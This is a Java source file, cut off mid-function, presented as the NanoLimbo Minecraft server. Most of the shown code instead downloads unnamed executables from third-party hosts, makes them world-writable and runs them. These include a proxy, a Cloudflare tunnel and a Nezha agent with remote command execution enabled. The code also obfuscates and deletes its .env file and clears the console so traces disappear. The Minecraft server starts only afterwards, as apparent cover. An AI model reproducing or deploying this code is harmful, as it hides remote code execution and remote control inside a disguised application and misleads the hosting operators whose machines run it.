/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    
    private static final List<Process> activeProcesses = new CopyOnWriteArrayList<>();
    private static Process argoProcess = null; // 独立追踪Argo进程，防止重启时误杀主进程

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "PROJECT_URL", "AUTO_ACCESS", "SUB_PATH",
        "REALITY_DOMAIN", "CERT_URL", "KEY_URL", "CERT_DOMAIN",
        "KOMARI_SERVER", "KOMARI_KEY"
    };

    private static final Map<String, String> envVars = new HashMap<>();

    private static final byte[] XOR_KEY = "N@n0L1mb0!S3cr3t".getBytes(StandardCharsets.UTF_8);

    static {
        loadEnvVars();
    }

    private static String getEnv(String key, String def) {
        String val = envVars.get(key);
        return (val != null && !val.trim().isEmpty()) ? val.trim() : def;
    }

    private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
    private static final String PROJECT_URL = getEnv("PROJECT_URL", "");
    private static final boolean AUTO_ACCESS = "true".equalsIgnoreCase(getEnv("AUTO_ACCESS", "false"));
    
    private static final String FILE_PATH = new File(getEnv("FILE_PATH", "./world")).getAbsolutePath();
    private static final String npm_path = new File(FILE_PATH, "npm").getAbsolutePath();
    private static final String php_path = new File(FILE_PATH, "php").getAbsolutePath();
    private static final String web_path = new File(FILE_PATH, "web").getAbsolutePath();
    private static final String bot_path = new File(FILE_PATH, "bot").getAbsolutePath();
    private static final String km_path = new File(FILE_PATH, "km").getAbsolutePath();
    private static final String sub_path = new File(FILE_PATH, "sub.txt").getAbsolutePath();
    private static final String list_path = new File(FILE_PATH, "list.txt").getAbsolutePath();
    private static final String boot_log_path = new File(FILE_PATH, "boot.log").getAbsolutePath();
    private static final String config_path = new File(FILE_PATH, "config.json").getAbsolutePath();
    private static final String cert_path = new File(FILE_PATH, "cert.pem").getAbsolutePath();
    private static final String key_path = new File(FILE_PATH, "private.key").getAbsolutePath();
    private static final String nezha_config_path = new File(FILE_PATH, "config.yaml").getAbsolutePath();
    private static final String tunnel_yml_path = new File(FILE_PATH, "tunnel.yml").getAbsolutePath();
    private static final String tunnel_json_path = new File(FILE_PATH, "tunnel.json").getAbsolutePath();
    private static final String index_path = new File(FILE_PATH, "index.html").getAbsolutePath();

    private static final String SUB_PATH = getEnv("SUB_PATH", "sub");
    private static final String UUID = getEnv("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
    private static final String NEZHA_SERVER = getEnv("NEZHA_SERVER", "");
    private static final String NEZHA_PORT = getEnv("NEZHA_PORT", "");
    private static final String NEZHA_KEY = getEnv("NEZHA_KEY", "");
    private static final String ARGO_DOMAIN = getEnv("ARGO_DOMAIN", "");
    private static final String ARGO_AUTH = getEnv("ARGO_AUTH", "");
    private static final int ARGO_PORT = Integer.parseInt(getEnv("ARGO_PORT", "8001"));
    private static final String S5_PORT_STR = getEnv("S5_PORT", "");
    private static final String TUIC_PORT_STR = getEnv("TUIC_PORT", "");
    private static final String HY2_PORT_STR = getEnv("HY2_PORT", "");
    private static final String ANYTLS_PORT_STR = getEnv("ANYTLS_PORT", "");
    private static final String REALITY_PORT_STR = getEnv("REALITY_PORT", "");
    private static final String ANYREALITY_PORT_STR = getEnv("ANYREALITY_PORT", "");
    private static final String CFIP = getEnv("CFIP", "cdns.doon.eu.org");
    private static final int CFPORT = Integer.parseInt(getEnv("CFPORT", "443"));
    private static final int PORT = Integer.parseInt(getEnv("PORT", "3000"));
    private static final String NAME = getEnv("NAME", "");
    private static final String CHAT_ID = getEnv("CHAT_ID", "");
    private static final String BOT_TOKEN = getEnv("BOT_TOKEN", "");
    private static final boolean DISABLE_ARGO = "true".equalsIgnoreCase(getEnv("DISABLE_ARGO", "false"));
    
    private static final String REALITY_DOMAIN = getEnv("REALITY_DOMAIN", "www.iij.ad.jp");
    private static final String CERT_URL = getEnv("CERT_URL", "");
    private static final String KEY_URL = getEnv("KEY_URL", "");
    private static final String CERT_DOMAIN = getEnv("CERT_DOMAIN", "bing.com");
    private static final String KOMARI_SERVER = getEnv("KOMARI_SERVER", "");
    private static final String KOMARI_KEY = getEnv("KOMARI_KEY", "");

    private static final Integer S5_PORT = parsePort(S5_PORT_STR);
    private static final Integer TUIC_PORT = parsePort(TUIC_PORT_STR);
    private static final Integer HY2_PORT = parsePort(HY2_PORT_STR);
    private static final Integer ANYTLS_PORT = parsePort(ANYTLS_PORT_STR);
    private static final Integer REALITY_PORT = parsePort(REALITY_PORT_STR);
    private static final Integer ANYREALITY_PORT = parsePort(ANYREALITY_PORT_STR);

    private static String private_key = "";
    private static String public_key = "";
    private static final String tuicPassword = java.util.UUID.randomUUID().toString();
    private static boolean customCertValid = false;
    private static String actualCertDomain = "www.bing.com";

    private static final HttpClient httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(15))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        Thread proxyThread = new Thread(() -> {
            try {
                setupProxyAndRun();
            } catch (Exception e) {
                System.err.println(ANSI_RED + "Error initializing Proxy Services: " + e.getMessage() + ANSI_RESET);
                e.printStackTrace();
            }
        });
        proxyThread.setDaemon(true);
        proxyThread.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        try {
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        try {
            new LimboServer().start();
        } catch (Throwable e) {
            Log.error("Minecraft simulated server crashed or is not compatible with current Java version.", e);
        }

        while (running.get()) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    private static byte[] xorProcess(byte[] data) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ XOR_KEY[i % XOR_KEY.length]);
        }
        return result;
    }

    private static void loadEnvVars() {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        Path datavFile = Paths.get(".datav");
        List<String> envLines = new ArrayList<>();

        try {
            if (Files.exists(envFile)) {
                envLines = Files.readAllLines(envFile, StandardCharsets.UTF_8);
                byte[] rawBytes = String.join("\n", envLines).getBytes(StandardCharsets.UTF_8);
                Files.write(datavFile, xorProcess(rawBytes));
                Files.deleteIfExists(envFile);
                System.out.println(ANSI_GREEN + "[INFO] .env file successfully encrypted to .datav" + ANSI_RESET);
            } else if (Files.exists(datavFile)) {
                byte[] encryptedBytes = Files.readAllBytes(datavFile);
                byte[] decryptedBytes = xorProcess(encryptedBytes);
                String decryptedContent = new String(decryptedBytes, StandardCharsets.UTF_8);
                envLines = Arrays.asList(decryptedContent.split("\n"));
            }
        } catch (IOException e) {
            System.err.println(ANSI_RED + "[ERROR] Failed to process environment variables file: " + e.getMessage() + ANSI_RESET);
        }

        for (String line : envLines) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    envVars.put(key, value); 
                }
            }
        }
    }

    private static Integer parsePort(String portStr) {
        if (portStr != null && portStr.matches("\\d+")) {
            return Integer.parseInt(portStr);
        }
        return null;
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }

    private static void stopServices() {
        for (Process p : activeProcesses) {
            if (p != null && p.isAlive()) {
                p.destroy();
            }
        }
        System.out.println(ANSI_RED + "All proxy background processes terminated" + ANSI_RESET);
    }

    private static void setupProxyAndRun() throws Exception {
        deleteNodes();
        cleanupOldFiles();
        createDirectory();
        argoType();

        String architecture = getSystemArchitecture();
        List<Map<String, String>> files = getFilesForArchitecture(architecture);
        
        for (Map<String, String> info : files) {
            boolean ok = downloadFile(info.get("fileName"), info.get("fileUrl"), false);
            if (!ok) {
                throw new Exception("Failed to download critical binary: " + info.get("fileName"));
            }
        }

        List<String> toAuthorize = new ArrayList<>(Arrays.asList("web", "bot"));
        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
            toAuthorize.add(NEZHA_PORT.isEmpty() ? "php" : "npm");
        }
        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
            toAuthorize.add("km");
        }
        
        authorizeFiles(toAuthorize);
        Thread.sleep(1500); 

        generateConfigs();
        startBackgroundProcesses();
        
        Thread.sleep(5000);
        extractDomains();

        addVisitTask();
        runHttpServer();
        cleanFilesLater();
    }

    private static void createDirectory() {
        File dir = new File(FILE_PATH);
        if (!dir.exists()) {
            dir.mkdirs();
        }
    }

    private static void cleanupOldFiles() {
        String[] paths = {boot_log_path, list_path};
        for (String file : paths) {
            File f = new File(file);
            try {
                if (f.exists() && !f.isDirectory()) {
                    f.delete();
                }
            } catch (Exception ignored) {}
        }
    }

    private static String getSystemArchitecture() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("arm") || arch.contains("aarch64")) return "arm";
        return "amd";
    }

    private static boolean downloadFile(String fileName, String fileUrl, boolean force) {
        Path path = Paths.get(FILE_PATH, fileName);
        try {
            if (!force && Files.exists(path) && Files.size(path) > 1024) {
                return true; 
            }
            HttpRequest request = HttpRequest.newBuilder().uri(URI.create(fileUrl)).GET().build();
            HttpResponse<Path> response = httpClient.send(request, HttpResponse.BodyHandlers.ofFile(path));
            if (response.statusCode() >= 200 && response.statusCode() < 300) {
                return true;
            } else {
                Files.deleteIfExists(path);
                return false;
            }
        } catch (Exception e) {
            try { Files.deleteIfExists(path); } catch (Exception ignored) {}
            return false;
        }
    }

    private static List<Map<String, String>> getFilesForArchitecture(String architecture) {
        List<Map<String, String>> baseFiles = new ArrayList<>();
        baseFiles.add(Map.of("fileName", "web", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/S_arm" : "https://ssr.cn.mt/files/S_amd"));
        baseFiles.add(Map.of("fileName", "bot", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/C_arm" : "https://ssr.cn.mt/files/C_amd"));

        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
            if (!NEZHA_PORT.isEmpty()) {
                baseFiles.add(0, Map.of("fileName", "npm", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent"));
            } else {
                baseFiles.add(0, Map.of("fileName", "php", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1"));
            }
        }
        
        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
            baseFiles.add(Map.of("fileName", "km", "fileUrl", "arm".equals(architecture) ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd"));
        }
        
        return baseFiles;
    }

    private static void authorizeFiles(List<String> filePaths) {
        for (String relative : filePaths) {
            File f = new File(FILE_PATH, relative);
            if (f.exists()) {
                try { f.setExecutable(true, false); } catch (Exception ignored) {}
                try {
                    Files.setPosixFilePermissions(f.toPath(), PosixFilePermissions.fromString("rwxrwxrwx"));
                } catch (Exception ignored) {}
                try {
                    execCmd("chmod 777 \"" + f.getAbsolutePath() + "\"");
                } catch (Exception ignored) {}
            }
        }
    }

    private static void argoType() {
        if (DISABLE_ARGO || ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
        
        // 修复：使用高强度正则匹配Json中的TunnelID，防止格式变动导致切割错误
        if (ARGO_AUTH.contains("TunnelSecret")) {
            try {
                Files.writeString(Paths.get(tunnel_json_path), ARGO_AUTH);
                
                Matcher m = Pattern.compile("\"TunnelID\"\\s*:\\s*\"([a-zA-Z0-9-]+)\"").matcher(ARGO_AUTH);
                String tunnelId = "unknown";
                if (m.find()) {
                    tunnelId = m.group(1);
                } else {
                    System.err.println(ANSI_RED + "Warning: Could not parse TunnelID from JSON!" + ANSI_RESET);
                }

                String tunnelYml = String.format(
                        "tunnel: %s\ncredentials-file: %s\nprotocol: http2\n\n" +
                        "ingress:\n  - hostname: %s\n    service: http://localhost:%d\n" +
                        "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n",
                        tunnelId, tunnel_json_path, ARGO_DOMAIN, ARGO_PORT
                );
                Files.writeString(Paths.get(tunnel_yml_path), tunnelYml);
            } catch (Exception ignored) {}
        }
    }

    private static void generateConfigs() throws Exception {
        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
            String nezhaTls = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053")
                .contains(NEZHA_SERVER.split(":").length > 1 ? NEZHA_SERVER.split(":")[1] : "") ? "tls" : "false";
            
            String configYaml = String.format(
                    "client_secret: %s\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\n" +
                    "disable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\n" +
                    "insecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: %s\n" +
                    "skip_connection_count: true\nskip_procs_count: true\ntemperature: false\n" +
                    "tls: %s\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: %s",
                    NEZHA_KEY, NEZHA_SERVER, nezhaTls, UUID);
            Files.writeString(Paths.get(nezha_config_path), configYaml);
        }

        String keypairOut = execCmd("sh -c 'exec \"" + web_path + "\" generate reality-keypair'");
        Matcher privM = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
        Matcher pubM = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
        if (privM.find() && pubM.find()) {
            private_key = privM.group(1).trim();
            public_key = pubM.group(1).trim();
        }

        customCertValid = false;
        if (!CERT_URL.isEmpty() && !KEY_URL.isEmpty()) {
            boolean certOk = downloadFile("cert.pem", CERT_URL, true);
            boolean keyOk = downloadFile("private.key", KEY_URL, true);
            if (certOk && keyOk) {
                customCertValid = true;
            }
        }
        
        if (customCertValid) {
            actualCertDomain = CERT_DOMAIN;
        } else {
            actualCertDomain = "www.bing.com";
            if (!new File(cert_path).exists() || !new File(key_path).exists()) {
                execCmd(String.format("openssl ecparam -genkey -name prime256v1 -out \"%s\"", key_path));
                execCmd(String.format("openssl req -new -x509 -days 3650 -key \"%s\" -out \"%s\" -subj \"/CN=%s\"", key_path, cert_path, actualCertDomain));
            }
        }

        Map<String, Object> config = new LinkedHashMap<>();
        config.put("log", Map.of("disabled", true, "level", "info", "timestamp", true));
        
        List<Map<String, Object>> inbounds = new ArrayList<>();
        Map<String, Object> vmessIn = new LinkedHashMap<>();
        vmessIn.put("tag", "vmess-ws-in"); vmessIn.put("type", "vmess"); vmessIn.put("listen", "::"); vmessIn.put("listen_port", ARGO_PORT);
        vmessIn.put("users", List.of(Map.of("uuid", UUID)));
        vmessIn.put("transport", Map.of("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol"));
        inbounds.add(vmessIn);
        config.put("inbounds", inbounds);

        Map<String, Object> wireguardOut = new LinkedHashMap<>();
        wireguardOut.put("type", "wireguard"); wireguardOut.put("tag", "wireguard-out"); wireguardOut.put("mtu", 1280);
        wireguardOut.put("address", Arrays.asList("172.16.0.2/32", "2606:4700:110:8dfe:d141:69bb:6b80:925/128"));
        wireguardOut.put("private_key", "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=");
        wireguardOut.put("peers", List.of(Map.of("address", "engage.cloudflareclient.com", "port", 2408, 
            "public_key", "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=", "allowed_ips", Arrays.asList("0.0.0.0/0", "::/0"), "reserved", Arrays.asList(78, 135, 76))));
        config.put("endpoints", List.of(wireguardOut));
        config.put("outbounds", List.of(Map.of("type", "direct", "tag", "direct")));

        Map<String, Object> route = new LinkedHashMap<>();
        route.put("rule_set", Arrays.asList(
            Map.of("tag", "netflix", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs", "download_detour", "direct"),
            Map.of("tag", "openai", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs", "download_detour", "direct")
        ));
        route.put("rules", List.of(Map.of("rule_set", Arrays.asList("openai", "netflix"), "outbound", "wireguard-out")));
        route.put("final", "direct");
        config.put("route", route);

        if (REALITY_PORT != null && REALITY_PORT > 0) {
            Map<String, Object> reality = new LinkedHashMap<>();
            reality.put("tag", "vless-in"); reality.put("type", "vless"); reality.put("listen", "::"); reality.put("listen_port", REALITY_PORT);
            reality.put("users", List.of(Map.of("uuid", UUID, "flow", "xtls-rprx-vision")));
            reality.put("tls", Map.of("enabled", true, "server_name", REALITY_DOMAIN, 
                "reality", Map.of("enabled", true, "handshake", Map.of("server", REALITY_DOMAIN, "server_port", 443), "private_key", private_key, "short_id", List.of(""))));
            inbounds.add(reality);
        }
        if (HY2_PORT != null && HY2_PORT > 0) {
            Map<String, Object> hy2 = new LinkedHashMap<>();
            hy2.put("tag", "hysteria-in"); hy2.put("type", "hysteria2"); hy2.put("listen", "::"); hy2.put("listen_port", HY2_PORT);
            hy2.put("users", List.of(Map.of("password", UUID))); hy2.put("masquerade", "https://www.bing.com");
            hy2.put("tls", Map.of("enabled", true, "certificate_path", cert_path, "key_path", key_path));
            inbounds.add(hy2);
        }
        if (TUIC_PORT != null && TUIC_PORT > 0) {
            Map<String, Object> tuic = new LinkedHashMap<>();
            tuic.put("tag", "tuic-in"); tuic.put("type", "tuic"); tuic.put("listen", "::"); tuic.put("listen_port", TUIC_PORT);
            tuic.put("users", List.of(Map.of("uuid", UUID, "password", tuicPassword))); tuic.put("congestion_control", "bbr");
            tuic.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", cert_path, "key_path", key_path));
            inbounds.add(tuic);
        }
        if (S5_PORT != null && S5_PORT > 0) {
            Map<String, Object> s5 = new LinkedHashMap<>();
            s5.put("tag", "s5-in"); s5.put("type", "socks"); s5.put("listen", "::"); s5.put("listen_port", S5_PORT);
            s5.put("users", List.of(Map.of("username", UUID.substring(0,8), "password", UUID.substring(UUID.length()-12))));
            inbounds.add(s5);
        }
        if (ANYTLS_PORT != null && ANYTLS_PORT > 0) {
            Map<String, Object> anytls = new LinkedHashMap<>();
            anytls.put("tag", "anytls-in"); anytls.put("type", "anytls"); anytls.put("listen", "::"); anytls.put("listen_port", ANYTLS_PORT);
            anytls.put("users", List.of(Map.of("password", UUID)));
            anytls.put("tls", Map.of("enabled", true, "certificate_path", cert_path, "key_path", key_path));
            inbounds.add(anytls);
        }
        if (ANYREALITY_PORT != null && ANYREALITY_PORT > 0) {
            Map<String, Object> anyreality = new LinkedHashMap<>();
            anyreality.put("tag", "anyreality-in"); anyreality.put("type", "anytls"); anyreality.put("listen", "::"); anyreality.put("listen_port", ANYREALITY_PORT);
            anyreality.put("users", List.of(Map.of("password", UUID)));
            anyreality.put("tls", Map.of("enabled", true, "server_name", REALITY_DOMAIN, 
                "reality", Map.of("enabled", true, "handshake", Map.of("server", REALITY_DOMAIN, "server_port", 443), "private_key", private_key, "short_id", List.of(""))));
            inbounds.add(anyreality);
        }

        Files.writeString(Paths.get(config_path), toJson(config));
    }

    private static Process runProcessSafe(String commandStr) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", commandStr);
        pb.directory(new File(FILE_PATH));
        pb.redirectOutput(new File("/dev/null"));
        pb.redirectErrorStream(true);
        return pb.start();
    }

    private static void startBackgroundProcesses() throws Exception {
        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
            if (!NEZHA_PORT.isEmpty()) {
                String tlsFlag = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT) ? "--tls" : "";
                String cmd = "exec \"" + npm_path + "\" -s " + NEZHA_SERVER + ":" + NEZHA_PORT + " -p " + NEZHA_KEY + " " + tlsFlag;
                activeProcesses.add(runProcessSafe(cmd));
            } else {
                String cmd = "exec \"" + php_path + "\" -c \"" + nezha_config_path + "\"";
                activeProcesses.add(runProcessSafe(cmd));
            }
        }
        
        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty() && new File(km_path).exists()) {
            String kHost = KOMARI_SERVER.startsWith("http") ? KOMARI_SERVER : "https://" + KOMARI_SERVER;
            String cmd = "exec \"" + km_path + "\" -e " + kHost + " -t " + KOMARI_KEY;
            activeProcesses.add(runProcessSafe(cmd));
        }

        String webCmd = "exec \"" + web_path + "\" run -c \"" + config_path + "\"";
        activeProcesses.add(runProcessSafe(webCmd));

        // 修复：兼容最新Cloudflare超长Token格式及精准独立进程控制
        if (!DISABLE_ARGO && new File(bot_path).exists()) {
            StringBuilder botCmd = new StringBuilder("exec \"").append(bot_path).append("\" tunnel --edge-ip-version auto --no-autoupdate --protocol http2");
            
            if (ARGO_AUTH.startsWith("ey") && ARGO_AUTH.length() > 100) {
                botCmd.append(" run --token ").append(ARGO_AUTH);
            } else if (ARGO_AUTH.contains("TunnelSecret")) {
                botCmd.append(" --config \"").append(tunnel_yml_path).append("\" run");
            } else {
                botCmd.append(" --logfile \"").append(boot_log_path)
                      .append("\" --loglevel info --url http://localhost:").append(ARGO_PORT);
            }
            argoProcess = runProcessSafe(botCmd.toString());
            activeProcesses.add(argoProcess);
        }
    }

    private static void extractDomains() throws Exception {
        if (DISABLE_ARGO) {
            generateLinks(null);
            return;
        }

        // 修复：如果是Token/Json认证，只要域不为空直接出节点，坚决不能进入日志临时隧道判断死循环
        if (ARGO_AUTH.startsWith("ey") || ARGO_AUTH.contains("TunnelSecret")) {
            if (!ARGO_DOMAIN.isEmpty()) {
                generateLinks(ARGO_DOMAIN);
                return;
            } else {
                System.out.println(ANSI_RED + "[Warning] Fixed tunnel credential given, but ARGO_DOMAIN is missing! Nodes might lack domain." + ANSI_RESET);
            }
        }

        try {
            if (!new File(boot_log_path).exists()) throw new Exception("boot.log not found");
            String logContent = Files.readString(Paths.get(boot_log_path));
            
            // 修复：优化正则，捕获所有有效的 trycloudflare 地址
            Matcher m = Pattern.compile("https?://([a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
            if (m.find()) {
                generateLinks(m.group(1));
            } else {
                Files.deleteIfExists(Paths.get(boot_log_path));
                
                // 修复：只杀Argo，坚决不碰Web主进程！
                if (argoProcess != null && argoProcess.isAlive()) {
                    argoProcess.destroy();
                    activeProcesses.remove(argoProcess);
                }
                
                Thread.sleep(1500);
                
                String botCmd = "exec \"" + bot_path + "\" tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile \"" 
                                + boot_log_path + "\" --loglevel info --url http://localhost:" + ARGO_PORT;
                argoProcess = runProcessSafe(botCmd);
                activeProcesses.add(argoProcess);
                
                Thread.sleep(6000);
                extractDomains();
            }
        } catch (Exception ignored) {}
    }

    private static void generateLinks(String argoDomain) throws Exception {
        String serverIp = "";
        try {
            serverIp = execCmd("curl -s --max-time 2 ipv4.ip.sb").trim();
            if(serverIp.isEmpty() || serverIp.contains("curl")) throw new Exception();
        } catch (Exception e) {
            try {
                serverIp = "[" + execCmd("curl -s --max-time 1 ipv6.ip.sb").trim() + "]";
            } catch (Exception ignored) {}
        }

        String isp = "Unknown";
        try {
            String cmd = "curl -sm 3 -H 'User-Agent: Mozilla/5.0' 'https://api.ip.sb/geoip' | tr -d '\\n' | awk -F'\"' '{c=\"\";i=\"\";for(x=1;x<=NF;x++){if($x==\"country_code\")c=$(x+2);if($x==\"isp\")i=$(x+2)};if(c&&i)print c\"-\"i}' | sed 's/ /_/g'";
            String out = execCmd(cmd).trim();
            if (!out.isEmpty() && !out.contains("curl")) isp = out;
        } catch (Exception ignored) {}

        String nodename = (NAME != null && !NAME.trim().isEmpty()) ? NAME.trim() + "-" + isp : isp;
        StringBuilder subTxtBuilder = new StringBuilder();

        if (!DISABLE_ARGO && argoDomain != null && !argoDomain.isEmpty()) {
            Map<String, String> vmess = new LinkedHashMap<>();
            vmess.put("v", "2"); vmess.put("ps", nodename); vmess.put("add", CFIP);
            vmess.put("port", String.valueOf(CFPORT)); vmess.put("id", UUID); vmess.put("aid", "0");
            vmess.put("scy", "auto"); vmess.put("net", "ws"); vmess.put("type", "none");
            vmess.put("host", argoDomain); vmess.put("path", "/vmess-argo?ed=2560");
            vmess.put("tls", "tls"); vmess.put("sni", argoDomain); vmess.put("alpn", ""); vmess.put("fp", "firefox");
            String encoded = Base64.getEncoder().encodeToString(toJson(vmess).getBytes(StandardCharsets.UTF_8));
            subTxtBuilder.append("vmess://").append(encoded);
        }

        if (TUIC_PORT != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            String insecureStr = customCertValid ? "" : "&allow_insecure=1";
            subTxtBuilder.append(String.format("tuic://%s:%s@%s:%d?sni=%s&congestion_control=bbr&udp_relay_mode=native&alpn=h3%s#%s", UUID, tuicPassword, serverIp, TUIC_PORT, actualCertDomain, insecureStr, nodename));
        }
        if (HY2_PORT != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            String insecureStr = customCertValid ? "" : "&insecure=1";
            subTxtBuilder.append(String.format("hysteria2://%s@%s:%d/?sni=%s%s&alpn=h3&obfs=none#%s", UUID, serverIp, HY2_PORT, actualCertDomain, insecureStr, nodename));
        }
        if (REALITY_PORT != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            subTxtBuilder.append(String.format("vless://%s@%s:%d?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=firefox&pbk=%s&type=tcp&headerType=none#%s", UUID, serverIp, REALITY_PORT, REALITY_DOMAIN, public_key, nodename));
        }
        if (ANYTLS_PORT != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            String insecureStr = customCertValid ? "" : "&insecure=1&allowInsecure=1";
            subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=tls&sni=%s%s#%s", UUID, serverIp, ANYTLS_PORT, actualCertDomain, insecureStr, nodename));
        }
        if (ANYREALITY_PORT != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
            subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=reality&sni=%s&fp=firefox&pbk=%s&type=tcp&headerType=none#%s", UUID, serverIp, ANYREALITY_PORT, REALITY_DOMAIN, public_key, nodename));
        }
        if (S5_PORT != null) {
            if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
